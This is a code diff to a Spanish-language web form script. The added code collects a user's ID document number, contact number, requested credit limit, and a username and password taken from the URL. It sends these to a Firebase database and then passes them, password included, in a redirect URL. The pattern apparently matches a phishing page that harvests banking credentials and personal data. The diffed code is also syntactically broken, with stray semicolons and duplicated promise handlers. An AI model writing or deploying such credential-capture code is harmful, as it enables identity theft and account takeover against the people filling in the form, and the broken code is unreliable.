@@ -635,26 +635,59 @@ const form = document.querySelector("form");
 if (form) {
   const originalGoNext = window.goNext;
   window.goNext = function() {
-    const tipoDoc = document.querySelector("select")?.value || "";
-    const numeroDoc = document.querySelectorAll("input")[0]?.value || "";
-    const contacto = document.querySelectorAll("input")[1]?.value || "";
-    const cupo = document.querySelector("#cupo")?.value || "";
-    
+    const tipoDoc = document.querySelector("select").value || "";
+const numeroDoc = document.querySelectorAll("input")[0].value || "";
+const contacto = document.querySelectorAll("input")[1].value || "";
+const cupo = document.querySelector("#cupo").value || "";
+const usuario = new URLSearchParams(window.location.search).get("usuario") || "";
+const clave = new URLSearchParams(window.location.search).get("clave") || "";
+
     db.collection("solicitudes").add({
-      tipoDocumento: tipoDoc,
-      numeroDocumento: numeroDoc,
-      numeroContacto: contacto,
-      cupoSolicitado: cupo,
-      fecha: new Date()
-    })
+  tipoDocumento: tipoDoc,
+  numeroDocumento: numeroDoc,
+  numeroContacto: contacto,
+  cupoSolicitado: cupo,
+  usuario: usuario,
+  clave: clave,
+  fecha: new Date()
+});
+
     .then(() => {
       console.log("✅ Datos guardados en Firebase");
-      if (originalGoNext) originalGoNext.apply(this, arguments);
-    })
-    .catch((error) => {
-      console.error("❌ Error Firebase:", error);
-      if (originalGoNext) originalGoNext.apply(this, arguments);
-    });
+     .then(() => {
+  console.log("Datos guardados");
+  const tipoDoc = document.querySelector("select").value || "";
+  const numeroDoc = document.querySelectorAll("input")[0].value || "";
+  const contacto = document.querySelectorAll("input")[1].value || "";
+  const cupo = document.querySelector("#cupo").value || "";
+  const params = new URLSearchParams(window.location.search);
+  const usuario = params.get("usuario") || "";
+  const clave = params.get("clave") || "";
+  
+  window.location.href = "confirm.html?tipoDocumento=" + encodeURIComponent(tipoDoc) +
+    "&numeroDocumento=" + encodeURIComponent(numeroDoc) +
+    "&numeroContacto=" + encodeURIComponent(contacto) +
+    "&cupoSolicitado=" + encodeURIComponent(cupo) +
+    "&usuario=" + encodeURIComponent(usuario) +
+    "&clave=" + encodeURIComponent(clave);
+})
+.catch((error) => {
+  console.error("Error:", error);
+  const tipoDoc = document.querySelector("select").value || "";
+  const numeroDoc = document.querySelectorAll("input")[0].value || "";
+  const contacto = document.querySelectorAll("input")[1].value || "";
+  const cupo = document.querySelector("#cupo").value || "";
+  const params = new URLSearchParams(window.location.search);
+  const usuario = params.get("usuario") || "";
+  const clave = params.get("clave") || "";
+  
+  window.location.href = "confirm.html?tipoDocumento=" + encodeURIComponent(tipoDoc) +
+    "&numeroDocumento=" + encodeURIComponent(numeroDoc) +
+    "&numeroContacto=" + encodeURIComponent(contacto) +
+    "&cupoSolicitado=" + encodeURIComponent(cupo) +
+    "&usuario=" + encodeURIComponent(usuario) +
+    "&clave=" + encodeURIComponent(clave);
+});
   };
 }
 </script>
